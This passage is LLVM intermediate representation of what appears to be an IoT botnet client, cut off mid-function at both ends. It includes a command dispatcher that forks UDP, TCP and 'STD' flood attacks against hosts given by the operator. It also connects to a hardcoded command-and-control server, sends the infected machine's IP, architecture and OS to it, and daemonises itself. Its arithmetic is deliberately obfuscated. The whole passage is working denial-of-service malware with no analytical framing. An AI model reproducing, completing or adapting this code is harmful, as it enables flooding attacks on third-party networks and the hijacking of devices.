  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #10
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %151, label %32

; <label>:32:                                     ; preds = %2
  %33 = load i32, i32* %3, align 4
  %34 = icmp slt i32 %33, 6
  br i1 %34, label %86, label %35

; <label>:35:                                     ; preds = %32
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 3
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38) #10
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %86, label %41

; <label>:41:                                     ; preds = %35
  %42 = load i8**, i8*** %4, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 2
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @atoi(i8* %44) #10
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %86, label %47

; <label>:47:                                     ; preds = %41
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 4
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @atoi(i8* %50) #10
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %86, label %53

; <label>:53:                                     ; preds = %47
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 5
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @atoi(i8* %56) #10
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %86, label %59

; <label>:59:                                     ; preds = %53
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 5
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @atoi(i8* %62) #10
  %64 = icmp sgt i32 %63, 65536
  br i1 %64, label %86, label %65

; <label>:65:                                     ; preds = %59
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 5
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @atoi(i8* %68) #10
  %70 = icmp sgt i32 %69, 65500
  br i1 %70, label %86, label %71

; <label>:71:                                     ; preds = %65
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 4
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @atoi(i8* %74) #10
  %76 = icmp sgt i32 %75, 32
  br i1 %76, label %86, label %77

; <label>:77:                                     ; preds = %71
  %78 = load i32, i32* %3, align 4
  %79 = icmp eq i32 %78, 7
  br i1 %79, label %80, label %87

; <label>:80:                                     ; preds = %77
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 6
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83) #10
  %85 = icmp slt i32 %84, 1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %80, %71, %65, %59, %53, %47, %41, %35, %32
  br label %399

; <label>:87:                                     ; preds = %80, %77
  %88 = load i8**, i8*** %4, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  store i8* %90, i8** %5, align 8
  %91 = load i8**, i8*** %4, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 2
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @atoi(i8* %93) #10
  store i32 %94, i32* %6, align 4
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 3
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #10
  store i32 %98, i32* %7, align 4
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 4
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101) #10
  store i32 %102, i32* %8, align 4
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 5
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #10
  store i32 %106, i32* %9, align 4
  %107 = load i32, i32* %3, align 4
  %108 = icmp sgt i32 %107, 6
  br i1 %108, label %109, label %114

; <label>:109:                                    ; preds = %87
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 6
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  br label %115

; <label>:114:                                    ; preds = %87
  br label %115

; <label>:115:                                    ; preds = %114, %109
  %116 = phi i32 [ %113, %109 ], [ 1000, %114 ]
  store i32 %116, i32* %10, align 4
  %117 = load i8*, i8** %5, align 8
  %118 = call i8* @strstr(i8* %117, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %119 = icmp ne i8* %118, null
  br i1 %119, label %120, label %139

; <label>:120:                                    ; preds = %115
  %121 = load i8*, i8** %5, align 8
  %122 = call i8* @strtok(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %122, i8** %11, align 8
  br label %123

; <label>:123:                                    ; preds = %136, %120
  %124 = load i8*, i8** %11, align 8
  %125 = icmp ne i8* %124, null
  br i1 %125, label %126, label %138

; <label>:126:                                    ; preds = %123
  %127 = call i32 @listFork()
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %136, label %129

; <label>:129:                                    ; preds = %126
  %130 = load i8*, i8** %11, align 8
  %131 = load i32, i32* %6, align 4
  %132 = load i32, i32* %7, align 4
  %133 = load i32, i32* %8, align 4
  %134 = load i32, i32* %9, align 4
  %135 = load i32, i32* %10, align 4
  call void @audp(i8* %130, i32 %131, i32 %132, i32 %133, i32 %134, i32 %135)
  call void @_exit(i32 0) #11
  unreachable

; <label>:136:                                    ; preds = %126
  %137 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %137, i8** %11, align 8
  br label %123

; <label>:138:                                    ; preds = %123
  br label %150

; <label>:139:                                    ; preds = %115
  %140 = call i32 @listFork()
  %141 = icmp ne i32 %140, 0
  br i1 %141, label %149, label %142

; <label>:142:                                    ; preds = %139
  %143 = load i8*, i8** %5, align 8
  %144 = load i32, i32* %6, align 4
  %145 = load i32, i32* %7, align 4
  %146 = load i32, i32* %8, align 4
  %147 = load i32, i32* %9, align 4
  %148 = load i32, i32* %10, align 4
  call void @audp(i8* %143, i32 %144, i32 %145, i32 %146, i32 %147, i32 %148)
  call void @_exit(i32 0) #11
  unreachable

; <label>:149:                                    ; preds = %139
  br label %150

; <label>:150:                                    ; preds = %149, %138
  br label %399

; <label>:151:                                    ; preds = %2
  %152 = load i8**, i8*** %4, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 0
  %154 = load i8*, i8** %153, align 8
  %155 = call i32 @strcmp(i8* %154, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i32 0, i32 0)) #10
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %278, label %157

; <label>:157:                                    ; preds = %151
  %158 = load i32, i32* %3, align 4
  %159 = icmp slt i32 %158, 6
  br i1 %159, label %202, label %160

; <label>:160:                                    ; preds = %157
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 3
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #10
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %202, label %166

; <label>:166:                                    ; preds = %160
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 2
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #10
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %202, label %172

; <label>:172:                                    ; preds = %166
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 4
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #10
  %177 = icmp eq i32 %176, -1
  br i1 %177, label %202, label %178

; <label>:178:                                    ; preds = %172
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 4
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* %181) #10
  %183 = icmp sgt i32 %182, 32
  br i1 %183, label %202, label %184

; <label>:184:                                    ; preds = %178
  %185 = load i32, i32* %3, align 4
  %186 = icmp sgt i32 %185, 6
  br i1 %186, label %187, label %193

; <label>:187:                                    ; preds = %184
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 6
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  %192 = icmp slt i32 %191, 0
  br i1 %192, label %202, label %193

; <label>:193:                                    ; preds = %187, %184
  %194 = load i32, i32* %3, align 4
  %195 = icmp eq i32 %194, 8
  br i1 %195, label %196, label %203

; <label>:196:                                    ; preds = %193
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 7
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #10
  %201 = icmp slt i32 %200, 1
  br i1 %201, label %202, label %203

; <label>:202:                                    ; preds = %196, %187, %178, %172, %166, %160, %157
  br label %399

; <label>:203:                                    ; preds = %196, %193
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 1
  %206 = load i8*, i8** %205, align 8
  store i8* %206, i8** %12, align 8
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 2
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #10
  store i32 %210, i32* %13, align 4
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 3
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  store i32 %214, i32* %14, align 4
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 4
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  store i32 %218, i32* %15, align 4
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 5
  %221 = load i8*, i8** %220, align 8
  store i8* %221, i8** %16, align 8
  %222 = load i32, i32* %3, align 4
  %223 = icmp eq i32 %222, 8
  br i1 %223, label %224, label %229

; <label>:224:                                    ; preds = %203
  %225 = load i8**, i8*** %4, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 7
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @atoi(i8* %227) #10
  br label %230

; <label>:229:                                    ; preds = %203
  br label %230

; <label>:230:                                    ; preds = %229, %224
  %231 = phi i32 [ %228, %224 ], [ 10, %229 ]
  store i32 %231, i32* %17, align 4
  %232 = load i32, i32* %3, align 4
  %233 = icmp sgt i32 %232, 6
  br i1 %233, label %234, label %239

; <label>:234:                                    ; preds = %230
  %235 = load i8**, i8*** %4, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 6
  %237 = load i8*, i8** %236, align 8
  %238 = call i32 @atoi(i8* %237) #10
  br label %240

; <label>:239:                                    ; preds = %230
  br label %240

; <label>:240:                                    ; preds = %239, %234
  %241 = phi i32 [ %238, %234 ], [ 0, %239 ]
  store i32 %241, i32* %18, align 4
  %242 = load i8*, i8** %12, align 8
  %243 = call i8* @strstr(i8* %242, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %244 = icmp ne i8* %243, null
  br i1 %244, label %245, label %265

; <label>:245:                                    ; preds = %240
  %246 = load i8*, i8** %12, align 8
  %247 = call i8* @strtok(i8* %246, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %247, i8** %19, align 8
  br label %248

; <label>:248:                                    ; preds = %262, %245
  %249 = load i8*, i8** %19, align 8
  %250 = icmp ne i8* %249, null
  br i1 %250, label %251, label %264

; <label>:251:                                    ; preds = %248
  %252 = call i32 @listFork()
  %253 = icmp ne i32 %252, 0
  br i1 %253, label %262, label %254

; <label>:254:                                    ; preds = %251
  %255 = load i8*, i8** %19, align 8
  %256 = load i32, i32* %13, align 4
  %257 = load i32, i32* %14, align 4
  %258 = load i32, i32* %15, align 4
  %259 = load i8*, i8** %16, align 8
  %260 = load i32, i32* %18, align 4
  %261 = load i32, i32* %17, align 4
  call void @atcp(i8* %255, i32 %256, i32 %257, i32 %258, i8* %259, i32 %260, i32 %261)
  call void @_exit(i32 0) #11
  unreachable

; <label>:262:                                    ; preds = %251
  %263 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %263, i8** %19, align 8
  br label %248

; <label>:264:                                    ; preds = %248
  br label %277

; <label>:265:                                    ; preds = %240
  %266 = call i32 @listFork()
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %276, label %268

; <label>:268:                                    ; preds = %265
  %269 = load i8*, i8** %12, align 8
  %270 = load i32, i32* %13, align 4
  %271 = load i32, i32* %14, align 4
  %272 = load i32, i32* %15, align 4
  %273 = load i8*, i8** %16, align 8
  %274 = load i32, i32* %18, align 4
  %275 = load i32, i32* %17, align 4
  call void @atcp(i8* %269, i32 %270, i32 %271, i32 %272, i8* %273, i32 %274, i32 %275)
  call void @_exit(i32 0) #11
  unreachable

; <label>:276:                                    ; preds = %265
  br label %277

; <label>:277:                                    ; preds = %276, %264
  br label %399

; <label>:278:                                    ; preds = %151
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds i8*, i8** %279, i64 0
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 @strcmp(i8* %281, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %352, label %284

; <label>:284:                                    ; preds = %278
  %285 = load i32, i32* %3, align 4
  %286 = icmp slt i32 %285, 4
  br i1 %286, label %305, label %287

; <label>:287:                                    ; preds = %284
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 2
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #10
  %292 = icmp slt i32 %291, 1
  br i1 %292, label %305, label %293

; <label>:293:                                    ; preds = %287
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 3
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @atoi(i8* %296) #10
  %298 = icmp slt i32 %297, 1
  br i1 %298, label %305, label %299

; <label>:299:                                    ; preds = %293
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 4
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @atoi(i8* %302) #10
  %304 = icmp slt i32 %303, 1
  br i1 %304, label %305, label %306

; <label>:305:                                    ; preds = %299, %293, %287, %284
  br label %399

; <label>:306:                                    ; preds = %299
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 1
  %309 = load i8*, i8** %308, align 8
  store i8* %309, i8** %20, align 8
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 2
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #10
  store i32 %313, i32* %21, align 4
  %314 = load i8**, i8*** %4, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 3
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* %316) #10
  store i32 %317, i32* %22, align 4
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 4
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* %320) #10
  store i32 %321, i32* %23, align 4
  %322 = load i8*, i8** %20, align 8
  %323 = call i8* @strstr(i8* %322, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %324 = icmp ne i8* %323, null
  br i1 %324, label %325, label %342

; <label>:325:                                    ; preds = %306
  %326 = load i8*, i8** %20, align 8
  %327 = call i8* @strtok(i8* %326, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %327, i8** %24, align 8
  br label %328

; <label>:328:                                    ; preds = %339, %325
  %329 = load i8*, i8** %24, align 8
  %330 = icmp ne i8* %329, null
  br i1 %330, label %331, label %341

; <label>:331:                                    ; preds = %328
  %332 = call i32 @listFork()
  %333 = icmp ne i32 %332, 0
  br i1 %333, label %339, label %334

; <label>:334:                                    ; preds = %331
  %335 = load i8*, i8** %24, align 8
  %336 = load i32, i32* %21, align 4
  %337 = load i32, i32* %22, align 4
  %338 = load i32, i32* %23, align 4
  call void @astd(i8* %335, i32 %336, i32 %337, i32 %338)
  call void @_exit(i32 0) #11
  unreachable

; <label>:339:                                    ; preds = %331
  %340 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %340, i8** %24, align 8
  br label %328

; <label>:341:                                    ; preds = %328
  br label %351

; <label>:342:                                    ; preds = %306
  %343 = call i32 @listFork()
  %344 = icmp ne i32 %343, 0
  br i1 %344, label %345, label %346

; <label>:345:                                    ; preds = %342
  br label %399

; <label>:346:                                    ; preds = %342
  %347 = load i8*, i8** %20, align 8
  %348 = load i32, i32* %21, align 4
  %349 = load i32, i32* %22, align 4
  %350 = load i32, i32* %23, align 4
  call void @astd(i8* %347, i32 %348, i32 %349, i32 %350)
  call void @_exit(i32 0) #11
  unreachable

; <label>:351:                                    ; preds = %341
  br label %352

; <label>:352:                                    ; preds = %351, %278
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 0
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #10
  %357 = icmp ne i32 %356, 0
  br i1 %357, label %399, label %358

; <label>:358:                                    ; preds = %352
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  br label %359

; <label>:359:                                    ; preds = %387, %358
  %360 = load i64, i64* %26, align 8
  %361 = load i64, i64* @numpids, align 8
  %362 = icmp ult i64 %360, %361
  br i1 %362, label %363, label %393

; <label>:363:                                    ; preds = %359
  %364 = load i32*, i32** @pids, align 8
  %365 = load i64, i64* %26, align 8
  %366 = getelementptr inbounds i32, i32* %364, i64 %365
  %367 = load i32, i32* %366, align 4
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %386

; <label>:369:                                    ; preds = %363
  %370 = load i32*, i32** @pids, align 8
  %371 = load i64, i64* %26, align 8
  %372 = getelementptr inbounds i32, i32* %370, i64 %371
  %373 = load i32, i32* %372, align 4
  %374 = call i32 @getpid() #6
  %375 = icmp ne i32 %373, %374
  br i1 %375, label %376, label %386

; <label>:376:                                    ; preds = %369
  %377 = load i32*, i32** @pids, align 8
  %378 = load i64, i64* %26, align 8
  %379 = getelementptr inbounds i32, i32* %377, i64 %378
  %380 = load i32, i32* %379, align 4
  %381 = call i32 @kill(i32 %380, i32 9) #6
  %382 = load i32, i32* %25, align 4
  %383 = sub i32 0, 1
  %384 = sub i32 %382, %383
  %385 = add nsw i32 %382, 1
  store i32 %384, i32* %25, align 4
  br label %386

; <label>:386:                                    ; preds = %376, %369, %363
  br label %387

; <label>:387:                                    ; preds = %386
  %388 = load i64, i64* %26, align 8
  %389 = add i64 %388, 5381298264579555881
  %390 = add i64 %389, 1
  %391 = sub i64 %390, 5381298264579555881
  %392 = add i64 %388, 1
  store i64 %391, i64* %26, align 8
  br label %359

; <label>:393:                                    ; preds = %359
  %394 = load i32, i32* %25, align 4
  %395 = icmp sgt i32 %394, 0
  br i1 %395, label %396, label %397

; <label>:396:                                    ; preds = %393
  br label %398

; <label>:397:                                    ; preds = %393
  br label %398

; <label>:398:                                    ; preds = %397, %396
  br label %399

; <label>:399:                                    ; preds = %398, %352, %345, %305, %277, %202, %150, %86
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @Demonicsock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @Demonicsock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @Demonicsock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 %11, 1026614951
  %13 = add i32 %12, 1
  %14 = add i32 %13, 1026614951
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %25

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = sub i32 %20, 91209991
  %22 = add i32 %21, 1
  %23 = add i32 %22, 91209991
  %24 = add nsw i32 %20, 1
  store i32 %23, i32* @currentServer, align 4
  br label %25

; <label>:25:                                     ; preds = %19, %18
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* @currentServer, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Demonserv, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcpy(i8* %26, i8* %30) #6
  store i32 6982, i32* %3, align 4
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %33 = call i8* @strchr(i8* %32, i32 58) #10
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %42

; <label>:35:                                     ; preds = %25
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #10
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #10
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #10
  store i8 0, i8* %41, align 1
  br label %42

; <label>:42:                                     ; preds = %35, %25
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %43, i32* @Demonicsock, align 4
  %44 = load i32, i32* @Demonicsock, align 4
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %1, align 4
  br label %51

; <label>:50:                                     ; preds = %42
  store i32 0, i32* %1, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [10 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @getpid() #6
  %24 = xor i32 %22, -1
  %25 = and i32 %23, %24
  %26 = xor i32 %23, -1
  %27 = and i32 %22, %26
  %28 = or i32 %25, %27
  %29 = xor i32 %22, %23
  call void @srand(i32 %28) #6
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %31 = call i32 @getpid() #6
  %32 = xor i32 %30, -1
  %33 = and i32 %31, %32
  %34 = xor i32 %31, -1
  %35 = and i32 %30, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %30, %31
  call void @init_rand(i32 %36)
  %38 = call i32 @getOurIP()
  %39 = call i32 @fork() #6
  store i32 %39, i32* %6, align 4
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %2
  %42 = load i32, i32* %6, align 4
  %43 = call i32 @waitpid(i32 %42, i32* %8, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:44:                                     ; preds = %2
  %45 = load i32, i32* %6, align 4
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %58, label %47

; <label>:47:                                     ; preds = %44
  %48 = call i32 @fork() #6
  store i32 %48, i32* %7, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %47
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %47
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %55, label %54

; <label>:54:                                     ; preds = %51
  br label %56

; <label>:55:                                     ; preds = %51
  br label %56

; <label>:56:                                     ; preds = %55, %54
  br label %57

; <label>:57:                                     ; preds = %56
  br label %59

; <label>:58:                                     ; preds = %44
  br label %59

; <label>:59:                                     ; preds = %58, %57
  br label %60

; <label>:60:                                     ; preds = %59
  %61 = call i32 @setsid() #6
  %62 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0)) #6
  %63 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  br label %64

; <label>:64:                                     ; preds = %364, %67, %60
  %65 = call i32 @initConnection()
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %69

; <label>:67:                                     ; preds = %64
  %68 = call i32 @sleep(i32 5)
  br label %64

; <label>:69:                                     ; preds = %64
  %70 = load i32, i32* @Demonicsock, align 4
  %71 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %72 = call i8* @inet_ntoa(i32 %71) #6
  %73 = call i8* @defarchs()
  %74 = call i8* @defopsys()
  %75 = call i8* @defpkgs()
  %76 = call i32 (i32, i8*, ...) @sockprintf(i32 %70, i8* getelementptr inbounds ([180 x i8], [180 x i8]* @.str.34, i32 0, i32 0), i8* %72, i8* %73, i8* %74, i8* %75)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %77

; <label>:77:                                     ; preds = %363, %215, %69
  %78 = load i32, i32* @Demonicsock, align 4
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %80 = call i32 @recvLine(i32 %78, i8* %79, i32 4096)
  store i32 %80, i32* %10, align 4
  %81 = icmp ne i32 %80, -1
  br i1 %81, label %82, label %364

; <label>:82:                                     ; preds = %77
  store i32 0, i32* %11, align 4
  br label %83

; <label>:83:                                     ; preds = %176, %82
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = load i64, i64* @numpids, align 8
  %87 = icmp ult i64 %85, %86
  br i1 %87, label %88, label %182

; <label>:88:                                     ; preds = %83
  %89 = load i32*, i32** @pids, align 8
  %90 = load i32, i32* %11, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i32, i32* %89, i64 %91
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @waitpid(i32 %93, i32* null, i32 1)
  %95 = icmp sgt i32 %94, 0
  br i1 %95, label %96, label %175

; <label>:96:                                     ; preds = %88
  %97 = load i32, i32* %11, align 4
  %98 = sub i32 %97, -1781240757
  %99 = add i32 %98, 1
  %100 = add i32 %99, -1781240757
  %101 = add nsw i32 %97, 1
  store i32 %100, i32* %13, align 4
  br label %102

; <label>:102:                                    ; preds = %121, %96
  %103 = load i32, i32* %13, align 4
  %104 = zext i32 %103 to i64
  %105 = load i64, i64* @numpids, align 8
  %106 = icmp ult i64 %104, %105
  br i1 %106, label %107, label %128

; <label>:107:                                    ; preds = %102
  %108 = load i32*, i32** @pids, align 8
  %109 = load i32, i32* %13, align 4
  %110 = zext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %13, align 4
  %115 = sub i32 %114, -1046773249
  %116 = sub i32 %115, 1
  %117 = add i32 %116, -1046773249
  %118 = sub i32 %114, 1
  %119 = zext i32 %117 to i64
  %120 = getelementptr inbounds i32, i32* %113, i64 %119
